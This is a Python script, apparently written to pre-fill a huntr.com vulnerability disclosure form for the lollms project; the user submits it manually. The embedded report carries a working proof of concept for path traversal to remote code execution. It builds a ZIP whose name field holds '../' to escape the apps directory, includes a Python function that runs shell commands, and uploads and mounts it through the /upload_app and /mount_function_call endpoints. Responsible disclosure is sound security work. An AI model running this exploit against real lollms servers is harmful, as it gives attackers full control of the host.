#!/usr/bin/env python3
"""
================================================================================
  Huntr.com Auto-Fill Script (Chrome Integration)
================================================================================

  ⚠️  WARNING: READ-ONLY SCRIPT — DO NOT MODIFY WITHOUT TESTING

  This script is configured and tested. Modifications may break:
  - Field selectors (IDs may change)
  - Timing delays
  - Form filling logic

  Before modifying:
  1. Create backup: cp autofill_huntr_final.py autofill_huntr_final.py.backup
  2. Test thoroughly: python3 autofill_huntr_final.py
  3. Verify screenshot shows all fields filled correctly

  Documentation: See README_AUTOFILL.md for usage instructions

  Last tested: 2026-04-02
  Status: ✅ WORKING

================================================================================

Connects to your existing Chrome browser and fills the vulnerability form

Usage: python3 autofill_huntr_final.py

Requirements:
  - Chrome running with --remote-debugging-port=9222
  - User logged in to huntr.com
  - Form page open in browser

"""

import asyncio
import json
from pathlib import Path
from playwright.async_api import async_playwright


# Form data
FORM_DATA = {
    "title": "Path Traversal in /upload_app leads to RCE via custom function injection",
    
    "description": """# Description

A critical Path Traversal vulnerability has been discovered in the lollms-webui application that allows authenticated attackers to achieve Remote Code Execution (RCE) by uploading malicious ZIP files to the `/upload_app` endpoint.

The vulnerability exists in `lollms/server/endpoints/lollms_apps.py` at line 340, where the `name` field from `description.yaml` is used directly in path operations without proper sanitization. This allows attackers to use path traversal sequences (`../`) in the application name to write files to arbitrary locations on the server.

## Technical Details:

- The `/upload_app` endpoint accepts ZIP file uploads for custom applications
- The `description.yaml` file inside the ZIP contains a `name` field
- This `name` field is used to construct the destination path without sanitization
- By setting `name` to `"../custom_function_calls/evil_func"`, attackers can escape the `apps_zoo` directory
- Once files are written to `custom_function_calls/`, the attacker can mount and execute arbitrary Python code via the `/mount_function_call` endpoint
- This leads to full Remote Code Execution on the server

**CVSS Score**: 8.8 (High)  
**CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

---

## Steps to Reproduce:

### Step 1: Get client_id via WebSocket
```python
import websocket, json, time, threading

client_id = None

def on_message(ws, message):
    global client_id
    data = json.loads(message)
    if "client_id" in str(data):
        cid = data.get("client_id") or data.get("data", {}).get("client_id")
        if cid:
            client_id = cid
            ws.close()

ws = websocket.WebSocketApp("ws://localhost:9600/ws", on_message=on_message)
t = threading.Thread(target=ws.run_forever, daemon=True)
t.start()
time.sleep(3)
```

### Step 2: Create malicious ZIP
```python
import zipfile, io
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("description.yaml", "name: ../custom_function_calls/evil_func\\n")
    zf.writestr("function.py", "import os\\ndef execute(**kwargs):\\n    result = os.popen('id && hostname').read()\\n    with open('/tmp/pwned_lollms', 'w') as f:\\n        f.write(result)\\n    return {'status': 'executed', 'output': result}")
```

### Step 3: Upload
```python
import requests
r = requests.post("http://localhost:9600/upload_app", params={"client_id": client_id}, files={"file": ("exploit.zip", buf.getvalue(), "application/zip")}, timeout=15)
print(f"Upload response: {r.status_code}")
```

### Step 4: Mount
```python
requests.post("http://localhost:9600/mount_function_call", json={"client_id": client_id, "function_category": "custom", "function_name": "evil_func"}, timeout=10)
```

### Step 5: Verify
Check if `/tmp/pwned_lollms` was created on the server.""",

    "impact": """This vulnerability allows authenticated attackers to achieve full Remote Code Execution on the server:

**Confidentiality Impact (HIGH)**: Attackers can read any file accessible by the lollms process including:
- Configuration files with API keys and credentials
- User data and conversation history
- Custom models and training data
- Environment variables and secrets

**Integrity Impact (HIGH)**: Attackers can write/overwrite arbitrary files:
- Plant backdoors in application code
- Modify configurations
- Inject malicious custom functions
- Deface the application

**Availability Impact (HIGH)**: Attackers can cause denial of service:
- Delete critical application files
- Corrupt the database
- Kill the lollms process

**Business Impact**:
- Complete server compromise
- Data breach of all user information
- Supply chain attack vector affecting all users
- Potential lateral movement into internal network""",

    "occurrences": {
        "permalink": "https://github.com/ParisNeo/lollms/blob/main/lollms/server/endpoints/lollms_apps.py#L340",
        "description": "Unsanitized 'name' field from description.yaml allows path traversal via '../' sequences."
    },

    "cvss": {
        "attack_vector": "Network",
        "attack_complexity": "Low",
        "privileges_required": "Low",
        "user_interaction": "None",
        "scope": "Unchanged",
        "confidentiality": "High",
        "integrity": "High",
        "availability": "High"
    }
}


async def autofill_form():
    print("=" * 60)
    print("Huntr.com Auto-Fill (Chrome Integration)")
    print("=" * 60)
    print()
    
    async with async_playwright() as p:
        print("[*] Connecting to your Chrome browser...")
        
        try:
            # Connect to existing Chrome instance
            browser = await p.chromium.connect_over_cdp(
                "http://localhost:9222",
                timeout=30000
            )
            
            # Get the first available context
            context = browser.contexts[0] if browser.contexts else await browser.new_context()
            page = context.pages[0] if context.pages else await context.new_page()
            
            print("[+] Connected to Chrome successfully!")
            print()
            
            # Check if we're on the right page
            current_url = page.url
            print(f"[*] Current URL: {current_url}")
            
            if "huntr.com" not in current_url:
                print("[!] Not on huntr.com. Navigating to form...")
                await page.goto("https://huntr.com/bounties/disclose/opensource?target=https://github.com/parisneo/lollms")
                await page.wait_for_load_state("networkidle")
                await asyncio.sleep(3)
            
            print()
            print("=" * 60)
            print("AUTO-FILL INSTRUCTIONS:")
            print("=" * 60)
            print()
            print("This script will:")
            print("  1. Show CVSS dropdown values to select manually (30 sec)")
            print("  2. Auto-fill all text fields (Title, Description, Impact, etc.)")
            print("  3. Take a screenshot for review")
            print("  4. You review and click 'Submit Report' manually")
            print()
            print("Press ENTER to continue...")
            await asyncio.get_event_loop().run_in_executor(None, input)
            
            # CVSS Dropdowns - show values for manual selection
            print()
            print("=" * 60)
            print("STEP 1: CVSS Dropdowns (MANUAL - 30 seconds)")
            print("=" * 60)
            print()
            print("Select these values in the CVSS section:")
            print()
            cvss_values = [
                ("Attack Vector", FORM_DATA["cvss"]["attack_vector"]),
                ("Attack Complexity", FORM_DATA["cvss"]["attack_complexity"]),
                ("Privileges Required", FORM_DATA["cvss"]["privileges_required"]),
                ("User Interaction", FORM_DATA["cvss"]["user_interaction"]),
                ("Scope", FORM_DATA["cvss"]["scope"]),
                ("Confidentiality", FORM_DATA["cvss"]["confidentiality"]),
                ("Integrity", FORM_DATA["cvss"]["integrity"]),
                ("Availability", FORM_DATA["cvss"]["availability"])
            ]
            
            for label, value in cvss_values:
                print(f"  • {label}: {value}")
            
            print()
            print("⏳  You have 35 seconds to select CVSS values...")
            print()
            await asyncio.sleep(35)
            
            # Auto-fill text fields
            print()
            print("=" * 60)
            print("STEP 2: Auto-filling text fields...")
            print("=" * 60)
            print()
            
            # Fill Title (ID: write-up-title)
            print("[*] Filling Title...")
            title_input = page.locator("#write-up-title")
            if await title_input.count() > 0:
                await title_input.fill(FORM_DATA["title"])
                print("    ✓ Title filled")
            else:
                print("    ⚠ Title field not found")
            await asyncio.sleep(0.5)
            
            # Fill Description (ID: readmeProp-input)
            print("[*] Filling Description...")
            desc_textarea = page.locator("#readmeProp-input")
            if await desc_textarea.count() > 0:
                await desc_textarea.fill(FORM_DATA["description"][:5000])
                print("    ✓ Description filled")
            else:
                print("    ⚠ Description field not found")
            await asyncio.sleep(0.5)
            
            # Fill Impact (ID: impactProp-input)
            print("[*] Filling Impact...")
            impact_textarea = page.locator("#impactProp-input")
            if await impact_textarea.count() > 0:
                await impact_textarea.fill(FORM_DATA["impact"])
                print("    ✓ Impact filled")
            else:
                print("    ⚠ Impact field not found")
            await asyncio.sleep(0.5)
            
            # Fill Occurrences Permalink (ID: permalink-url-0)
            print("[*] Filling Occurrences Permalink...")
            permalink_input = page.locator("#permalink-url-0")
            if await permalink_input.count() > 0:
                await permalink_input.fill(FORM_DATA["occurrences"]["permalink"])
                print("    ✓ Permalink filled")
            else:
                print("    ⚠ Permalink field not found")
            await asyncio.sleep(0.5)
            
            # Fill Occurrences Description (ID: description-0)
            print("[*] Filling Occurrences Description...")
            occ_desc_textarea = page.locator("#description-0")
            if await occ_desc_textarea.count() > 0:
                await occ_desc_textarea.fill(FORM_DATA["occurrences"]["description"])
                print("    ✓ Occurrence description filled")
            else:
                print("    ⚠ Occurrence description field not found")
            await asyncio.sleep(0.5)
            
            # Scroll to top for review
            print("[*] Scrolling to top for review...")
            await page.evaluate("window.scrollTo(0, 0)")
            
            # Take screenshot
            print("[*] Taking screenshot...")
            screenshot_path = Path(__file__).parent / "huntr_form_filled.png"
            await page.screenshot(path=str(screenshot_path), full_page=True)
            print(f"[+] Screenshot saved to: {screenshot_path}")
            
            print()
            print("=" * 60)
            print("AUTO-FILL COMPLETE!")
            print("=" * 60)
            print()
            print("✅ All text fields filled automatically")
            print("✅ CVSS dropdowns - you selected manually")
            print()
            print("📋 NEXT STEPS:")
            print()
            print("  1. Review the filled form in your browser")
            print("  2. Check the screenshot: huntr_form_filled.png")
            print("  3. Scroll down to find 'Submit Report' button")
            print("  4. Click 'Submit Report' when ready")
            print()
            print("⏳  Browser will stay open for 90 seconds for review...")
            print()
            
            await asyncio.sleep(90)
            
            await browser.close()
            
            print("[+] Browser closed.")
            print("[+] Done!")
            
        except Exception as e:
            print()
            print("=" * 60)
            print("ERROR!")
            print("=" * 60)
            print()
            print(f"Could not connect to Chrome: {e}")
            print()
            print("Make sure:")
            print("  1. Chrome is running with --remote-debugging-port=9222")
            print("  2. You're logged in to huntr.com")
            print("  3. The form page is open in Chrome")
            print()


if __name__ == "__main__":
    asyncio.run(autofill_form())
